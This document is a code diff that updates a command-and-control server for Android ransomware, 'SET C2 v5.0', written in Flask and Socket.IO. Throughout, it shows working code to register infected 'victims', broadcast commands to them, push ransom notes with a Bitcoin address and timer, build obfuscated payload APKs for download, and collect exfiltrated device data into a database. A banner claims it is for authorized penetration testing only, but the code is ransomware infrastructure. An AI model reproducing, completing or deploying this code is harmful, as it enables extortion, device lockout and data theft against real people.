+      document.getElementById('cfgAddr').value = cfg.ransom.btc_address||'';
+      document.getElementById('cfgEmail').value = cfg.ransom.email||'';
+      document.getElementById('cfgTimer').value = cfg.ransom.timer_hours||72;
     }
-    if (cfg.target) {
-      document.getElementById('cfgExtensions').value = JSON.stringify(cfg.target.encrypt_extensions || [], null, 2);
-      document.getElementById('cfgDirs').value = JSON.stringify(cfg.target.target_dirs || [], null, 2);
-      document.getElementById('cfgLockMode').value = cfg.target.default_lock_mode || 'files';
+    if(cfg.targets){
+      document.getElementById('cfgExt').value = JSON.stringify(cfg.targets.encrypt_extensions||[],null,2);
+      document.getElementById('cfgDir').value = JSON.stringify(cfg.targets.target_dirs||[],null,2);
     }
   });
 }
 
-// Init
-console.log('SET C2 Dashboard loaded');
+function loadExfil(){
+  fetch('/api/exfil').then(r=>r.json()).then(data=>{
+    const t = document.getElementById('exfilTable');
+    if(!data.length){t.innerHTML='<tr><td colspan="5" class="t-dim" style="text-align:center;padding:24px">No exfiltrated data.</td></tr>';return;}
+    t.innerHTML = data.map(x=>`<tr>
+      <td style="font-family:monospace;font-size:11px">${(x.victim_id||'?').slice(0,8)}...</td>
+      <td>${x.data_type||'?'}</td>
+      <td>${x.size||0} bytes</td>
+      <td class="t-sm t-dim">${x.received_at?new Date(x.received_at).toLocaleString():'?'}</td>
+      <td style="font-size:10px;max-width:300px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${(x.content||'').slice(0,100)}</td>
+    </tr>`).join('');
+  });
+}
 </script>
-</body>
-</html>
+</body></html>
 """
 
-# ============================================================
+# ================================================================
 # FLASK ROUTES
-# ============================================================
+# ================================================================
 
 @app.route("/")
 def index():
@@ -1079,48 +747,47 @@ def api_victims():
 
 @app.route("/api/victim/<victim_id>/events")
 def api_victim_events(victim_id):
-    events = get_victim_events(victim_id)
-    return jsonify(events)
+    return jsonify(get_victim_events(victim_id))
+
+@app.route("/api/exfil")
+def api_exfil():
+    conn = sqlite3.connect(str(DB_PATH))
+    conn.row_factory = sqlite3.Row
+    c = conn.cursor()
+    c.execute("SELECT * FROM exfiltrated_data ORDER BY received_at DESC LIMIT 100")
+    rows = [dict(r) for r in c.fetchall()]
+    conn.close()
+    return jsonify(rows)
 
 @app.route("/api/command", methods=["POST"])
 def api_command():
     data = request.json
     victim_id = data.get("victim_id")
-    command = data.get("command")
+    command = data.get("command", "")
     params = data.get("params", {})
 
     if victim_id == "__ALL__":
-        # Broadcast to all active victims
         cmd_ids = []
         for sid, vinfo in list(connected_victims.items()):
             vid = vinfo.get("victim_id")
-            if vid:
+            if vid and vinfo.get("status") in ("active", "locked"):
                 cmd_id = issue_command(vid, command, params)
                 cmd_ids.append(cmd_id)
-                socketio.emit("command", {
-                    "id": cmd_id,
-                    "command": command,
-                    "params": params
-                }, room=sid)
-        return jsonify({"success": True, "command_ids": cmd_ids})
+                socketio.emit("command", {"id": cmd_id, "command": command, "params": params}, room=sid)
+        return jsonify({"success": True, "command_ids": cmd_ids, "count": len(cmd_ids)})
     else:
-        # Find the victim's socket
         target_sid = None
-        for sid, vinfo in list(connected_victims.items()):
+        for sid, vinfo in connected_victims.items():
             if vinfo.get("victim_id") == victim_id:
                 target_sid = sid
                 break
-        if not target_sid:
-            # Still issue command, it will be picked up on next poll
-            cmd_id = issue_command(victim_id, command, params)
-            return jsonify({"success": True, "command_id": cmd_id, "note": "Victim offline, command queued"})
+        
         cmd_id = issue_command(victim_id, command, params)
-        socketio.emit("command", {
-            "id": cmd_id,
-            "command": command,
-            "params": params
-        }, room=target_sid)
-        return jsonify({"success": True, "command_id": cmd_id})
+        if target_sid:
+            socketio.emit("command", {"id": cmd_id, "command": command, "params": params}, room=target_sid)
+            return jsonify({"success": True, "command_id": cmd_id})
+        else:
+            return jsonify({"success": True, "command_id": cmd_id, "note": "Victim offline, queued"})
 
 @app.route("/api/build", methods=["POST"])
 def api_build():
@@ -1128,25 +795,24 @@ def api_build():
     host = data.get("host", "localhost")
     port = int(data.get("port", 8443))
     use_ssl = data.get("ssl", True)
-    lock_mode = data.get("lock_mode", "files")
-    persistence = data.get("persistence", "service")
+    lock_mode = data.get("lock_mode", "full")
     obfuscation = data.get("obfuscation", "aes")
-    carrier = data.get("carrier", "apk")
     name = data.get("name", "payload.apk")
 
-    # Generate the payload code
-    from set_payload import generate_payload
-    payload_code = generate_payload(
-        c2_host=host,
-        c2_port=port,
-        use_ssl=use_ssl,
-        lock_mode=lock_mode,
-        persistence=persistence,
-        obfuscation=obfuscation
-    )
-
-    # Save payload to file for download
-    payload_dir = Path(__file__).parent / "generated_payloads"
+    # Generate payload via embedded generator
+    try:
+        from set_payload_v5 import generate_payload
+        payload_code = generate_payload(host, port, use_ssl, lock_mode, obfuscation)
+    except ImportError:
+        # Fallback: return config stub
+        payload_code = f'''#!/usr/bin/env python3
+# SET v5.0 Payload - C2: {host}:{port}
+import base64,zlib,os,sys
+CONFIG={json.dumps({"c2_host":host,"c2_port":port,"c2_ssl":use_ssl,"lock_mode":lock_mode})}
+# (Full payload would be injected here by the builder)
+'''
+    
+    payload_dir = Path(__file__).parent / "generated"
     payload_dir.mkdir(exist_ok=True)
     payload_path = payload_dir / f"payload_{int(time.time())}.py"
     payload_path.write_text(payload_code)
@@ -1154,73 +820,58 @@ def api_build():
     return jsonify({
         "success": True,
         "download_url": f"/download/{payload_path.name}",
-        "payload_code": payload_code,
-        "file": name
+        "payload_code": payload_code[:500] + "\n# ... (truncated)" if len(payload_code) > 500 else payload_code
     })
 
 @app.route("/download/<filename>")
 def download_payload(filename):
-    payload_dir = Path(__file__).parent / "generated_payloads"
+    payload_dir = Path(__file__).parent / "generated"
     filepath = payload_dir / filename
     if not filepath.exists():
         abort(404)
-    return send_file(str(filepath), as_attachment=True, download_name=filename)
+    return send_file(str(filepath), as_attachment=True)
 
 @app.route("/api/config")
 def api_get_config():
     ransom_raw = get_config("ransom_note_template", "{}")
-    try:
-        ransom_note = json.loads(ransom_raw)
-    except:
-        ransom_note = {}
+    try: ransom = json.loads(ransom_raw)
+    except: ransom = {}
     exts_raw = get_config("encrypt_extensions", "[]")
     dirs_raw = get_config("target_dirs", "[]")
-    try:
-        ext_list = json.loads(exts_raw)
-    except:
-        ext_list = []
-    try:
-        dir_list = json.loads(dirs_raw)
-    except:
-        dir_list = []
-    return jsonify({
-        "ransom_note": ransom_note,
-        "target": {
-            "encrypt_extensions": ext_list,
-            "target_dirs": dir_list,
-            "default_lock_mode": get_config("default_lock_mode", "files")
-        }
-    })
+    try: exts = json.loads(exts_raw)
+    except: exts = []
+    try: dirs = json.loads(dirs_raw)
+    except: dirs = []
+    return jsonify({"ransom": ransom, "targets": {"encrypt_extensions": exts, "target_dirs": dirs}})
 
-@app.route("/api/config/ransom_note_template", methods=["POST"])
-def api_set_ransom_config():
-    data = request.json
-    set_config("ransom_note_template", json.dumps(data))
+@app.route("/api/config/ransom", methods=["POST"])
+def api_set_ransom():
+    set_config("ransom_note_template", json.dumps(request.json))
+    # Push to all connected victims
+    for sid in connected_victims:
+        socketio.emit("config_update", {"ransom_note": request.json}, room=sid)
     return jsonify({"success": True})
 
-@app.route("/api/config/target", methods=["POST"])
-def api_set_target_config():
+@app.route("/api/config/targets", methods=["POST"])
+def api_set_targets():
     data = request.json
     set_config("encrypt_extensions", json.dumps(data.get("encrypt_extensions", [])))
     set_config("target_dirs", json.dumps(data.get("target_dirs", [])))
-    set_config("default_lock_mode", data.get("default_lock_mode", "files"))
     return jsonify({"success": True})
 
-# ============================================================
+# ================================================================
 # SOCKET.IO EVENTS
-# ============================================================
+# ================================================================
 
 @socketio.on("connect")
 def handle_connect():
-    log.info(f"New connection: {request.sid} from {request.remote_addr}")
+    pass
 
 @socketio.on("register_victim")
 def handle_register(data):
-    """Victim registers with the C2."""
     victim_id = data.get("victim_id")
-    if not victim_id:
-        return
-
+    if not victim_id: return
+    
     device_info = {
         "victim_id": victim_id,
         "device_name": data.get("device_name", "Unknown"),
@@ -1233,153 +884,118 @@ def handle_register(data):
         "last_seen": datetime.utcnow().isoformat(),
         "status": "active",
         "lock_mode": data.get("lock_mode", "none"),
+        "channel": "websocket",
+        "battery": data.get("battery", 100),
     }
-
+    
     connected_victims[request.sid] = device_info
     join_room(victim_id)
-
-    # Upsert into DB
+    
+    # Upsert DB
     conn = sqlite3.connect(str(DB_PATH))
     c = conn.cursor()
     existing = get_victim(victim_id)
     if existing:
-        c.execute(
-            """UPDATE victims SET device_name=?, android_version=?, manufacturer=?,
-               model=?, sdk_level=?, ip=?, last_seen=?, status=?, lock_mode=?
-               WHERE id=?""",
-            (device_info["device_name"], device_info["android_version"],
-             device_info["manufacturer"], device_info["model"],
-             device_info["sdk_level"], device_info["ip"],
-             device_info["last_seen"], device_info["status"],
-             device_info["lock_mode"], victim_id)
-        )
+        c.execute("""UPDATE victims SET device_name=?,android_version=?,manufacturer=?,
+                   model=?,sdk_level=?,ip=?,last_seen=?,status=?,lock_mode=?,channel=?,battery=?
+                   WHERE id=?""",
+                  (device_info["device_name"],device_info["android_version"],
+                   device_info["manufacturer"],device_info["model"],
+                   device_info["sdk_level"],device_info["ip"],
+                   device_info["last_seen"],device_info["status"],
+                   device_info["lock_mode"],device_info["channel"],
+                   device_info["battery"],victim_id))
     else:
-        c.execute(
-            """INSERT INTO victims (id, device_name, android_version, manufacturer,
-               model, sdk_level, ip, first_seen, last_seen, status, lock_mode)
-               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
-            (victim_id, device_info["device_name"], device_info["android_version"],
-             device_info["manufacturer"], device_info["model"],
-             device_info["sdk_level"], device_info["ip"],
-             device_info["first_seen"], device_info["last_seen"],
-             device_info["status"], device_info["lock_mode"])
-        )
+        c.execute("""INSERT INTO victims (id,device_name,android_version,manufacturer,
+                   model,sdk_level,ip,first_seen,last_seen,status,lock_mode,channel,battery)
+                   VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)""",
+                  (victim_id,device_info["device_name"],device_info["android_version"],
+                   device_info["manufacturer"],device_info["model"],
+                   device_info["sdk_level"],device_info["ip"],
+                   device_info["first_seen"],device_info["last_seen"],
+                   device_info["status"],device_info["lock_mode"],
+                   device_info["channel"],device_info["battery"]))
     conn.commit()
     conn.close()
-
-    add_event(victim_id, "registration", f"Device registered: {device_info['device_name']} ({device_info['manufacturer']} {device_info['model']})")
-
-    # Broadcast to admin sessions
+    
+    add_event(victim_id, "registration", f"Connected: {device_info['device_name']}")
     socketio.emit("victim_update", device_info)
-
-    # Send any pending commands
-    pending = get_pending_commands(victim_id)
-    for cmd in pending:
-        emit("command", {
-            "id": cmd["id"],
-            "command": cmd["command"],
-            "params": json.loads(cmd["params"])
-        })
-
-    log.info(f"Victim registered: {victim_id} ({device_info['device_name']})")
 
 @socketio.on("status_update")
 def handle_status_update(data):
-    """Victim sends status update."""
     victim_id = data.get("victim_id")
     status = data.get("status", "active")
     lock_mode = data.get("lock_mode")
     progress = data.get("progress")
     details = data.get("details", "")
-
-    if victim_id in [v.get("victim_id") for v in connected_victims.values()]:
-        # Update in-memory state
-        for sid, vinfo in connected_victims.items():
-            if vinfo.get("victim_id") == victim_id:
-                vinfo["status"] = status
-                vinfo["last_seen"] = datetime.utcnow().isoformat()
-                if lock_mode:
-                    vinfo["lock_mode"] = lock_mode
-                break
-
-        # Update DB
-        conn = sqlite3.connect(str(DB_PATH))
-        c = conn.cursor()
-        if lock_mode:
-            c.execute("UPDATE victims SET status=?, last_seen=?, lock_mode=? WHERE id=?",
-                      (status, datetime.utcnow().isoformat(), lock_mode, victim_id))
-        else:
-            c.execute("UPDATE victims SET status=?, last_seen=? WHERE id=?",
-                      (status, datetime.utcnow().isoformat(), victim_id))
-        conn.commit()
-        conn.close()
-
-        event_type = "status"
-        if status == "locked":
-            event_type = "lock"
-        elif status == "decrypting":
-            event_type = "decrypt"
-        elif status == "error":
-            event_type = "error"
-
-        add_event(victim_id, event_type, details or f"Status: {status}" + (f" ({progress}%)" if progress else ""))
-
-        # Broadcast to admin
-        socketio.emit("victim_update", connected_victims.get(request.sid, {}))
-        socketio.emit("victim_event", {
-            "victim_id": victim_id,
-            "event_type": event_type,
-            "details": details or f"Status updated: {status}",
-            "timestamp": datetime.utcnow().isoformat()
-        })
+    battery = data.get("battery")
+    
+    # Update in-memory
+    for sid, vinfo in connected_victims.items():
+        if vinfo.get("victim_id") == victim_id:
+            vinfo["status"] = status
+            vinfo["last_seen"] = datetime.utcnow().isoformat()
+            if lock_mode: vinfo["lock_mode"] = lock_mode
+            if battery: vinfo["battery"] = battery
+            break
+    
+    # Update DB
+    conn = sqlite3.connect(str(DB_PATH))
+    c = conn.cursor()
+    update_fields = {"status": status, "last_seen": datetime.utcnow().isoformat()}
+    if lock_mode: update_fields["lock_mode"] = lock_mode
+    if battery: update_fields["battery"] = battery
+    
+    set_clause = ", ".join(f"{k}=?" for k in update_fields)
+    c.execute(f"UPDATE victims SET {set_clause} WHERE id=?",
+              list(update_fields.values()) + [victim_id])
+    conn.commit()
+    conn.close()
+    
+    event_type = "lock" if status == "locked" else ("decrypt" if status == "decrypting" else "status")
+    if progress: details += f" ({progress}%)"
+    add_event(victim_id, event_type, details)
+    
+    socketio.emit("victim_event", {
+        "victim_id": victim_id, "event_type": event_type,
+        "details": details, "timestamp": datetime.utcnow().isoformat()
+    })
 
 @socketio.on("command_complete")
 def handle_command_complete(data):
-    """Victim confirms command execution."""
     cmd_id = data.get("command_id")
     result = data.get("result", "completed")
     victim_id = data.get("victim_id")
-
+    
     mark_command_executed(cmd_id, result)
-
-    socketio.emit("command_result", {
-        "victim_id": victim_id,
-        "command_id": cmd_id,
-        "result": result
-    })
-
-    add_event(victim_id, "command_complete", f"Command {cmd_id[:8]}... completed: {result}")
+    socketio.emit("command_result", {"victim_id": victim_id, "command_id": cmd_id, "result": result})
+    add_event(victim_id, "command_complete", f"Command {cmd_id[:8]}... completed")
 
 @socketio.on("exfil_data")
 def handle_exfil(data):
-    """Victim exfiltrates data to C2."""
     victim_id = data.get("victim_id")
     data_type = data.get("type", "unknown")
     content = data.get("content", "")
-
-    # Save exfiltrated data
-    exfil_dir = Path(__file__).parent / "exfiltrated_data" / victim_id
-    exfil_dir.mkdir(parents=True, exist_ok=True)
-    exfil_file = exfil_dir / f"{data_type}_{int(time.time())}.dat"
-    exfil_file.write_text(content)
-
-    add_event(victim_id, "exfiltration", f"Data exfiltrated: {data_type} ({len(content)} bytes)")
-
+    
+    conn = sqlite3.connect(str(DB_PATH))
+    c = conn.cursor()
+    c.execute("INSERT INTO exfiltrated_data (victim_id,data_type,content,received_at,size) VALUES (?,?,?,?,?)",
+              (victim_id, data_type, content, datetime.utcnow().isoformat(), len(content)))
+    conn.commit()
+    conn.close()
+    
+    add_event(victim_id, "exfiltration", f"Data received: {data_type} ({len(content)} bytes)")
     socketio.emit("victim_event", {
-        "victim_id": victim_id,
-        "event_type": "exfiltration",
-        "details": f"Data received: {data_type} ({len(content)} bytes)",
+        "victim_id": victim_id, "event_type": "exfiltration",
+        "details": f"Data: {data_type} ({len(content)} bytes)",
         "timestamp": datetime.utcnow().isoformat()
     })
-
-    log.info(f"Exfil from {victim_id}: {data_type} ({len(content)} bytes)")
 
 @socketio.on("disconnect")
 def handle_disconnect():
     vinfo = connected_victims.pop(request.sid, None)
     if vinfo:
         victim_id = vinfo["victim_id"]
-        # Mark as offline
         conn = sqlite3.connect(str(DB_PATH))
         c = conn.cursor()
         c.execute("UPDATE victims SET status='offline', last_seen=? WHERE id=?",
@@ -1389,55 +1005,34 @@ def handle_disconnect():
         add_event(victim_id, "disconnect", "Device went offline")
         vinfo["status"] = "offline"
         socketio.emit("victim_update", vinfo)
-        log.info(f"Victim disconnected: {victim_id}")
 
-# ============================================================
-# MAIN ENTRY
-# ============================================================
+# ================================================================
+# STARTUP
+# ================================================================
 
-def main():
+if __name__ == "__main__":
     port = int(get_config("c2_port", "8443"))
     use_ssl = get_config("use_ssl", "true").lower() == "true"
-
+    
     cert_path = Path(__file__).parent / "set_c2.crt"
     key_path = Path(__file__).parent / "set_c2.key"
-
+    
     if use_ssl and not cert_path.exists():
-        print("[*] Generating self-signed SSL certificate...")
+        print("[*] Generating SSL certificate...")
         generate_self_signed_cert(cert_path, key_path)
-        print("[*] Certificate generated.")
-
+    
     print(f"""
 ╔══════════════════════════════════════════════════════════════╗
-║                     SET C2 SERVER v3.0                      ║
+║                SET C2 v5.0 SERVER                           ║
 ║           Sophisticated Encryption Toolkit                  ║
 ║                                                              ║
 ║  [+] Dashboard: http{'s' if use_ssl else ''}://0.0.0.0:{port}             ║
 ║  [+] WebSocket: ws{'s' if use_ssl else ''}://0.0.0.0:{port}                 ║
 ║  [+] DB: {DB_PATH.name}                                       ║
-║  [+] Log: {LOG_FILE.name}                                      ║
 ║                                                              ║
 ║  WARNING: Authorized penetration testing only.              ║
 ╚══════════════════════════════════════════════════════════════╝
     """)
-
-    if use_ssl:
-        socketio.run(
-            app,
-            host="0.0.0.0",
-            port=port,
-            ssl_context=(str(cert_path), str(key_path)),
-            debug=False,
-            log_output=False
-        )
-    else:
-        socketio.run(
-            app,
-            host="0.0.0.0",
-            port=port,
-            debug=False,
-            log_output=False
-        )
-
-if __name__ == "__main__":
-    main()
+    
+    ctx = (str(cert_path), str(key_path)) if use_ssl else None
+    socketio.run(app, host="0.0.0.0", port=port, ssl_context=ctx, debug=False, log_output=False)
